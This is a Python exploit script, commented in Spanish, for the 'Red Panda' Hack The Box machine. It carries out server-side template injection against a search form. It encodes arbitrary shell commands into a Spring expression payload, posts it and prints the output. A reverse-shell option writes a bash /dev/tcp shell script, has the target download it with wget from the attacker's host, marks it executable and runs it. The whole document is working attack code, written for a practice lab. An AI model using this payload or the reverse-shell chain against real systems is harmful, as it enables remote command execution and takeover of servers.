#! /bin/python3

# Exploit Title: SSTI ATTACK (Server Side Template Injection) - Red Panda HTB
# Date: 20/07/2021
# Exploit Author: Kr4ken600

import sys, signal, time, requests, os
from bs4 import BeautifulSoup
from pwn import *

#Variables
url_direction="http://redpanda.htb:8080/search"
command = ''

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

def uso(action):
    print("\n[!] Uso: python3 %s <command|option>\n" % sys.argv[0])
    print("Example: python3 %s whoami\n" % sys.argv[0])
    print("Example: python3 %s 'ls -la'\n" % sys.argv[0])
    print("Example: python3 %s -p\n" % sys.argv[0])
    if action == True:
        print("\nOptions:\n")
        print("\t-h/--help\t\t\t:Panel de ayuda")
        print("\t-l\t\t\t\t:Ejecuta el comando 'ls -la' directamente")
        print("\t-w\t\t\t\t:Ejecuta el comando 'whoami' directamente")
        print("\t-p\t\t\t\t:Ejecuta el comando 'pwd' directamente")
        print("\t-rs [IP] <HTTP_PORT> <PORT>\t:Ejecuta una reverse shell")
    sys.exit(1)

def injection(comm):
    cmd = comm
    build = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime()"
    first_ascii = str(ord(comm[0]))
    build += ".exec(T(java.lang.Character).toString(" + first_ascii + ")"
    comm = comm[1:]

    for letter in comm:
        letter_ascii = str(ord(letter))
        build += ".concat(T(java.lang.Character).toString(" + letter_ascii + "))"

    build += ").getInputStream())}"
    makeRequest(comm=cmd, payload=build)

def makeRequest(comm, payload):
    s = requests.session()

    post_data = {
        'name': payload
    }

    r = s.post(url_direction, post_data)
    htmlParser = BeautifulSoup(r.text, 'html.parser')
    result = htmlParser.find_all("h2")[0].get_text()
    result =  "Command '%s':" % comm + result.replace('You searched for:','')

    print(result)
        
if len(sys.argv) < 2:
    uso(False)
elif sys.argv[1] == '--help' or sys.argv[1] == '-h':
    uso(True)
elif sys.argv[1] == '-l':
    command = 'ls -la'
elif sys.argv[1] == '-w':
    command = 'whoami'
elif sys.argv[1] == '-p':
    command = 'pwd'
elif sys.argv[1] == '-rs':
    p1 = log.progress("SSTI ATTACK - REDPANDA HTB")
    time.sleep(2)
    p2 = log.progress("STATUS")
    ip = '10.10.10.10'
    http_port = '80'
    port = '443'

    if len(sys.argv) >= 3:
        ip=sys.argv[2]

    if len(sys.argv) >= 4:
        http_port=sys.argv[3]

    if len(sys.argv) == 5:
        port=sys.argv[4]

    p2.status("Creando reverse shell...")
    file = open("rs.sh", "w")
    file.write("#! /bin/bash" + os.linesep)
    file.write("bash -i >& /dev/tcp/%s/%s 0>&1" % (ip, port))
    file.close()
    time.sleep(5)
    
    p2.status("Subiendo reverse shell...")
    command = 'wget http://%s:%s/rs.sh' % (ip, http_port)
    injection(command)
    time.sleep(5)
    os.remove('rs.sh')

    p2.status("Actualizando permisos de ejecucion...")
    command = 'chmod u+x rs.sh'
    injection(command)
    time.sleep(5)

    p2.status("Ejecutando reverse shell...")
    command = './rs.sh'
    injection(command)
else:
    command = sys.argv[1]


if __name__ == '__main__':
    injection(command)